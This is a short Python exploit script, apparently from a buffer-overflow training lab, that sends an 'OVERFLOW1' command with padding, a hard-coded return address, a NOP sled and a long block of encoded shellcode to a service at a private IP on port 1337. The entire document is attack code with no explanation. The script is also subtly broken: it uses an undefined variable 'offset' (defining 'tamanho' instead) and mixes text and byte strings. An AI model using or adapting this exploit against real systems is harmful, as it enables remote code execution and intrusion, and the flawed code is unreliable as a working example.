#!/usr/bin/python
import socket

ip = "10.10.45.246"
port = 1337

prefix = "OVERFLOW1 "
tamanho = 0
overflow = "A" * offset
retorno = "\x71\xe8\xd5\x77"
NOP = "\x90" * 16
buf =  b""
buf += b"\xba\x73\xd1\x7c\xe6\xdb\xc1\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x25\xdf\x9e"
buf += b"\x13\x35\x37\xdc\xdc\xc5\xc8\x81\x55\x20\xf9\x81\x02"
buf += b"\x21\xaa\x31\x40\x67\x47\xb9\x04\x93\xdc\xcf\x80\x94"
buf += b"\x55\x65\xf7\x9b\x66\xd6\xcb\xba\xe4\x25\x18\x1c\xd4"
buf += b"\xe5\x6d\x5d\x11\x1b\x9f\x0f\xca\x57\x32\xbf\x7f\x2d"
buf += b"\x8f\x34\x33\xa3\x97\xa9\x84\xc2\xb6\x7c\x9e\x9c\x18"
buf += b"\x7f\x73\x95\x10\x67\x90\x90\xeb\x1c\x62\x6e\xea\xf4"
buf += b"\xba\x8f\x41\x39\x73\x62\x9b\x7e\xb4\x9d\xee\x76\xc6"
buf += b"\x20\xe9\x4d\xb4\xfe\x7c\x55\x1e\x74\x26\xb1\x9e\x59"
buf += b"\xb1\x32\xac\x16\xb5\x1c\xb1\xa9\x1a\x17\xcd\x22\x9d"
buf += b"\xf7\x47\x70\xba\xd3\x0c\x22\xa3\x42\xe9\x85\xdc\x94"
buf += b"\x52\x79\x79\xdf\x7f\x6e\xf0\x82\x17\x43\x39\x3c\xe8"
buf += b"\xcb\x4a\x4f\xda\x54\xe1\xc7\x56\x1c\x2f\x10\x98\x37"
buf += b"\x97\x8e\x67\xb8\xe8\x87\xa3\xec\xb8\xbf\x02\x8d\x52"
buf += b"\x3f\xaa\x58\xf4\x6f\x04\x33\xb5\xdf\xe4\xe3\x5d\x35"
buf += b"\xeb\xdc\x7e\x36\x21\x75\x14\xcd\xa2\x70\xeb\xc6\xad"
buf += b"\xed\xe9\xd8\xd0\x56\x64\x3e\xb8\xb8\x21\xe9\x55\x20"
buf += b"\x68\x61\xc7\xad\xa6\x0c\xc7\x26\x45\xf1\x86\xce\x20"
buf += b"\xe1\x7f\x3f\x7f\x5b\x29\x40\x55\xf3\xb5\xd3\x32\x03"
buf += b"\xb3\xcf\xec\x54\x94\x3e\xe5\x30\x08\x18\x5f\x26\xd1"
buf += b"\xfc\x98\xe2\x0e\x3d\x26\xeb\xc3\x79\x0c\xfb\x1d\x81"
buf += b"\x08\xaf\xf1\xd4\xc6\x19\xb4\x8e\xa8\xf3\x6e\x7c\x63"
buf += b"\x93\xf7\x4e\xb4\xe5\xf7\x9a\x42\x09\x49\x73\x13\x36"
buf += b"\x66\x13\x93\x4f\x9a\x83\x5c\x9a\x1e\xa3\xbe\x0e\x6b"
buf += b"\x4c\x67\xdb\xd6\x11\x98\x36\x14\x2c\x1b\xb2\xe5\xcb"
buf += b"\x03\xb7\xe0\x90\x83\x24\x99\x89\x61\x4a\x0e\xa9\xa3"
postfix = ""

buffer = prefix + overflow + retorno + NOP + buf + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
